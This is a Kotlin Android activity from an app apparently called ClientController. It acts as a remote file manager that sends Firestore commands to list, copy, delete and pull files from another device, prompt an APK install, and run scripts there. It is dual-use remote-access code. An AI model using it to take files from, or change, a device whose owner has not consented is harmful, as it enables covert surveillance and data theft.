package com.clientcontroller

import android.app.AlertDialog
import android.app.Dialog
import android.app.ProgressDialog
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ArrayAdapter
import android.widget.PopupMenu
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.clientcontroller.databinding.ActivityFileManagerBinding
import com.clientcontroller.databinding.LayoutDialogBinding
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.storage.FirebaseStorage
import java.io.File

class FileManagerActivity : AppCompatActivity() {
    private lateinit var binding: ActivityFileManagerBinding
    private lateinit var path: String
    private lateinit var deviceId: String
    private lateinit var firestore: FirebaseFirestore
    private lateinit var data: MutableList<String>
    private lateinit var adapter: ArrayAdapter<String>
    private lateinit var listenerReg: ListenerRegistration
    private lateinit var storage: FirebaseStorage
    private lateinit var isDirList: MutableList<Boolean>
    private var newPath: String = ""
    private var progressDialog: ProgressDialog? = null
    private var downloadFileName = ""

    private fun sendCommandByFirestore(command: String): String? {
        // Generate a new document reference with an auto-generated ID
        val newDocRef = firestore.collection("Messages").document()
        val documentId = newDocRef.id

        // Prepare the data to be set in the document
        val data = hashMapOf(
            "For" to currentDeviceID,
            "From" to serverID,
            "Message" to command
        )

        // Attempt to set the data in the document
        newDocRef.set(data)
            .addOnFailureListener { exception ->
                // Handle any errors that occur during the write operation
                Toast.makeText(this, "Error: ${exception.localizedMessage}", Toast.LENGTH_LONG).show()
            }

        // Return the ID of the created document
        return documentId
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        binding = ActivityFileManagerBinding.inflate(layoutInflater)
        setContentView(binding.root)
        ViewCompat.setOnApplyWindowInsetsListener(binding.main) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
        path = intent.extras!!.getString("Path").toString()
        newPath = path
        deviceId = intent.extras!!.getString("DeviceID").toString()
        firestore = FirebaseFirestore.getInstance()
        storage = FirebaseStorage.getInstance()
        data = mutableListOf()
        isDirList = mutableListOf()
        progressDialog = ProgressDialog(this)
        adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, data)
        binding.listView.adapter = adapter
        val isInputtedByUser = intent.getBooleanExtra("IsInputtedByUser", true)
        if (isInputtedByUser) {
            sendCommandByFirestore("LIST_DIR $path")
        } else if (path == "<EXTERNAL_STORAGE_DIR>") {
            sendCommandByFirestore("GET_EXTERNAL_STORAGE_LOCATION")
        } else if (path == "<APP_STORAGE_DIR>") {
            sendCommandByFirestore("GET_APP_STORAGE_DIR")
        } else {
            finish()
        }
        binding.searchBox.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(p0: CharSequence?, p1: Int, p2: Int, p3: Int) {
            }

            override fun onTextChanged(p0: CharSequence?, p1: Int, p2: Int, p3: Int) {
                adapter.filter.filter(p0)
            }

            override fun afterTextChanged(p0: Editable?) {
            }

        })
        binding.listView.setOnItemClickListener { parent, view, position, id ->
            Log.d("FileManager", "Click - Is Dir: ${isDirList[position]}")
            if (data[position] == "..") {
                newPath = removeAfterLastSeparator(path, "/")
                if (newPath == "")
                    newPath = "/"
                sendCommandByFirestore("LIST_DIR $newPath")
                Log.d("FileManager", "New Path: $newPath")
            } else if (data[position] == ".") {
                sendCommandByFirestore("LIST_DIR $path")
            } else if (isDirList[position]) {
                newPath = (path + "/" + data[position]).replace("//", "/")
                Log.d("FileManager", "Path: $path")
                Log.d("FileManager", "New Path: $newPath")
                sendCommandByFirestore("LIST_DIR $newPath")
            } else {
                if (data[position].lowercase().endsWith(".apk")) {
                    AlertDialog.Builder(this)
                        .setTitle("Confirm Request App Installation")
                        .setMessage("Are you sure you want to request the device to install this app?")
                        .setPositiveButton("Yes") { dialog, _ ->
                            sendCommandByFirestore("PROMPT_TO_INSTALL_APP $path/${data[position]}")
                            dialog.dismiss()
                        }
                        .setNegativeButton("No") { dialog, _ ->
                            dialog.dismiss()
                        }
                        .show()
                } else if ((data[position].lowercase().endsWith(".mp4") || data[position].lowercase().endsWith(".mp3") || data[position].lowercase().endsWith(".m4a") || data[position].lowercase().endsWith(".wav") || data[position].lowercase().endsWith(".aac")) || data[position].lowercase().endsWith(".aiff")) {
                    AlertDialog.Builder(this)
                        .setTitle("Confirm Play Media File")
                        .setMessage("Are you sure you want to play this media file?")
                        .setPositiveButton("Yes") { dialog, _ ->
                            sendCommandByFirestore("PLAY_SONG $path/${data[position]}")
                            dialog.dismiss()
                        }
                        .setNegativeButton("No") { dialog, _ ->
                            dialog.dismiss()
                        }
                        .show()
                } else if (data[position].lowercase().endsWith(".py")) {
                    AlertDialog.Builder(this)
                        .setTitle("Confirm Run Python File")
                        .setMessage("Are you sure you want to run this python file?")
                        .setPositiveButton("Yes") { dialog, _ ->
                            Intent(this, InteractivePythonScriptActivity::class.java).also {
                                it.putExtra("FilePath", "$path/${data[position]}")
                                it.putExtra("Arguments", "")
                                startActivity(it)
                            }
                            dialog.dismiss()
                        }
                        .setNegativeButton("No") { dialog, _ ->
                            dialog.dismiss()
                        }
                        .show()
                }
            }
        }
        binding.listView.setOnItemLongClickListener { parent, view, position, id ->
            if (position < data.size) {
                // Inflate the popup menu
                val popupMenu = PopupMenu(this, view)
                popupMenu.inflate(R.menu.content_action_menu)

                // Set a click listener for the menu items
                popupMenu.setOnMenuItemClickListener { menuItem ->
                    when (menuItem.itemId) {
                        R.id.menu_item_copy -> {
                            // Handle copy action
                            val dialog = Dialog(this)
                            val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
                            dialog.setContentView(binding.root)
                            dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
                            binding.button.text = "Copy"
                            binding.editText.hint = "Destination Path"
                            binding.editText2.hint = "Name"
                            binding.editText2.visibility = View.VISIBLE
                            binding.editText2.setText(data[position])
                            binding.button.setOnClickListener {
                                val destPath = binding.editText.text.toString()
                                if (destPath.isEmpty()) {
                                    binding.editText.error = "Please enter a path"
                                    return@setOnClickListener
                                }
                                val name = binding.editText2.text.toString()
                                if (name.isEmpty()) {
                                    binding.editText2.error = "Please enter a name"
                                    return@setOnClickListener
                                }
                                sendCommandByFirestore("COPY ${path.removeSuffix("/")}/${data[position]} <?`> $path/$name")
                                dialog.dismiss()
                            }
                            // Show the dialog
                            dialog.show()
                            true
                        }
                        R.id.menu_item_delete -> {
                            // Handle delete action
                            if (data[position] != "") {
                                AlertDialog.Builder(this)
                                    .setTitle("Confirm Delete")
                                    .setMessage("Are you sure you want to delete ${File("${path.removeSuffix("/")}/${data[position]}").name}?")
                                    .setPositiveButton("Yes") { dialog, _ ->
                                        sendCommandByFirestore("DELETE ${path.removeSuffix("/")}/${data[position]}")
                                        dialog.dismiss()
                                    }
                                    .setNegativeButton("No") { dialog, _ ->
                                        dialog.dismiss()
                                    }
                                    .show()
                            }
                            true
                        }
                        R.id.menu_item_download -> {
                            if (data[position] != "") {
                                // Handle download action
                                progressDialog!!.setMessage("Uploading file from remote...")
                                progressDialog!!.setCancelable(false)
                                progressDialog!!.show()
                                downloadFileName = data[position]
                                sendCommandByFirestore("UPLOAD_FILE $path/${data[position]}")
                            }
                            true
                        }
                        R.id.menu_get_size -> {
                            if (data[position] != "") {
                                // Handle get file size action
                                sendCommandByFirestore("GET_FILE_SIZE $path/${data[position]}")
                            }
                            true
                        }
                        else -> false
                    }
                }

                // Show the popup menu
                popupMenu.show()
                true
            } else {
                false
            }
        }
        binding.createDirBtn.setOnClickListener {
            val dialog = Dialog(this)
            val binding = LayoutDialogBinding.inflate(LayoutInflater.from(this))
            dialog.setContentView(binding.root)
            dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
            binding.button.text = "Create Directory"
            binding.editText.hint = "Directory Name"
            binding.button.setOnClickListener {
                val dirName = binding.editText.text.toString()
                if (dirName.isEmpty()) {
                    binding.editText.error = "Please enter a directory name"
                    return@setOnClickListener
                }
                sendCommandByFirestore("MAKE_DIR $path/$dirName")
                dialog.dismiss()
            }
            // Show the dialog
            dialog.show()
        }
    }

    override fun onPause() {
        super.onPause()
        listenerReg.remove()
    }

    override fun onResume() {
        super.onResume()
        listenerReg = firestore.collection("Messages").addSnapshotListener { snapshot, error ->
            if (error != null) {
                // Handle error
                Toast.makeText(this, "Error: ${error.localizedMessage}", Toast.LENGTH_LONG).show()
                return@addSnapshotListener
            }
            if (snapshot != null) {
                for (change in snapshot.documentChanges) {
                    if ((change.document.getString("For") == serverID || change.document.getString("For") == legacyDefaultServerID) && change.document.getString("From") == deviceId && change.type == DocumentChange.Type.ADDED) {
                        val message = change.document.getString("Message")
                        if (message!!.startsWith("LIST_DIR: ")) {
                            if (message.startsWith("LIST_DIR: Operation failed")) {
                                Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                            } else {
                                val contents = message.removePrefix("LIST_DIR: ").split("/")
                                data.clear()
                                path = newPath
                                data.add(".")
                                if (path != intent.extras!!.getString("Path").toString())
                                    data.add("..")
                                isDirList.clear()
                                isDirList.add(true)
                                if (path != intent.extras!!.getString("Path").toString())
                                    isDirList.add(true)
                                for (content in contents) {
                                    if (content != "" && content != "." && content != "..") {
                                        Log.d("FileManager", content)
                                        data.add(content.removeSuffix("<:>"))
                                        if (content.endsWith("<:>"))
                                            isDirList.add(true)
                                        else
                                            isDirList.add(false)
                                    }
                                }
                                adapter.notifyDataSetChanged()
                            }
                        } else if (message.startsWith("DELETE: ")) {
                            Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                            if (message =="DELETE: Operation completed successfully") {
                                sendCommandByFirestore("LIST_DIR $path")
                            }
                        } else if (message == "INSTALL_APP: Operation completed successfully") {
                            Toast.makeText(this, "INSTALL_APP: Opened installation screen", Toast.LENGTH_LONG).show()
                        } else if (message.startsWith("UPLOAD_FILE: ")) {
                            if (message == "UPLOAD_FILE: Operation completed successfully") {
                                if (downloadFileName != "") {
                                    progressDialog!!.setMessage("Downloading file from server...")
                                    val path = "${Environment.getExternalStorageDirectory().path}/Client/$deviceId/$downloadFileName"
                                    File("${Environment.getExternalStorageDirectory().path}/Client",
                                        deviceId
                                    ).mkdirs()
                                    val file = File(path)
                                    storage.reference.child(downloadFileName).getFile(file)
                                        .addOnCompleteListener {
                                            progressDialog!!.dismiss()
                                            if (it.isSuccessful) {
                                                Toast.makeText(
                                                    this,
                                                    "File downloaded successfully",
                                                    Toast.LENGTH_SHORT
                                                ).show()
                                                val mimeType = contentResolver.getType(Uri.fromFile(file))
                                                val intent = Intent(Intent.ACTION_VIEW).apply {
                                                    setDataAndType(FileProvider.getUriForFile(applicationContext, "${BuildConfig.APPLICATION_ID}.fileprovider", file), mimeType)
                                                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION) // Grant read permission
                                                }
                                                startActivity(intent)
                                            } else {
                                                Toast.makeText(
                                                    this,
                                                    "Error: ${it.exception?.localizedMessage}",
                                                    Toast.LENGTH_LONG
                                                ).show()
                                            }
                                            storage.reference.child(downloadFileName).delete().addOnFailureListener {
                                                Toast.makeText(
                                                    this,
                                                    "Error: ${it.localizedMessage}",
                                                    Toast.LENGTH_LONG
                                                ).show()
                                            }
                                            downloadFileName = ""
                                        }
                                }
                            } else {
                                progressDialog!!.dismiss()
                                Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                            }
                        } else if (message == "MAKE_DIR: Operation completed successfully") {
                            Toast.makeText(this, "Directory created successfully", Toast.LENGTH_LONG).show()
                            sendCommandByFirestore("LIST_DIR $path")
                        } else if (message.startsWith("COPY: ")) {
                            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
                            if (message == "COPY: Operation completed successfully") {
                                sendCommandByFirestore("LIST_DIR $path")
                            }
                        } else if (message.startsWith("GET_EXTERNAL_STORAGE_LOCATION: ") || message.startsWith("GET_APP_STORAGE_DIR: ")) {
                            path = message.removePrefix("GET_EXTERNAL_STORAGE_LOCATION: ").removePrefix("GET_APP_STORAGE_DIR: ")
                            newPath = path
                            sendCommandByFirestore("LIST_DIR $path")
                        } else {
                            Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                        }
                        firestore.collection("Messages").document(change.document.id).delete().addOnFailureListener {
                            Toast.makeText(this, "Error: ${it.localizedMessage}", Toast.LENGTH_LONG).show()
                        }
                        val err = "Error: Failed to save to history file"
                        try {
                            if (currentDeviceID != "") {
                                val dir = File(
                                    Environment.getExternalStorageDirectory(),
                                    "ClientController"
                                )
                                if (!dir.exists()) {
                                    if (!dir.mkdirs()) {
                                        Toast.makeText(this, err, Toast.LENGTH_LONG)
                                            .show()
                                    }
                                }
                                var file = File(dir, "$currentDeviceID.txt")
                                if (file.length() > 25000) {
                                    var name = "$currentDeviceID.1.txt"
                                    var i = 2
                                    while (File(dir, name).exists()) {
                                        name = "$currentDeviceID.$i.txt"
                                        i += 1
                                    }
                                    file.renameTo(
                                        File(
                                            dir,
                                            name
                                        )
                                    )
                                    file = File(dir, "$currentDeviceID.txt")
                                }
                                if (!file.exists()) {
                                    file.createNewFile()
                                }
                                file.appendText("Received:\n$message\n\n")
                            }
                        } catch (ex: Exception) {
                            Toast.makeText(this, ex.localizedMessage, Toast.LENGTH_LONG).show()
                            Toast.makeText(this, err, Toast.LENGTH_LONG).show()
                        }
                    }
                }
            }
        }
    }

    fun removeAfterLastSeparator(text: String, separator: String): String {
        val lastIndex = text.lastIndexOf(separator)
        return if (lastIndex >= 0) text.substring(0, lastIndex) else text
    }
}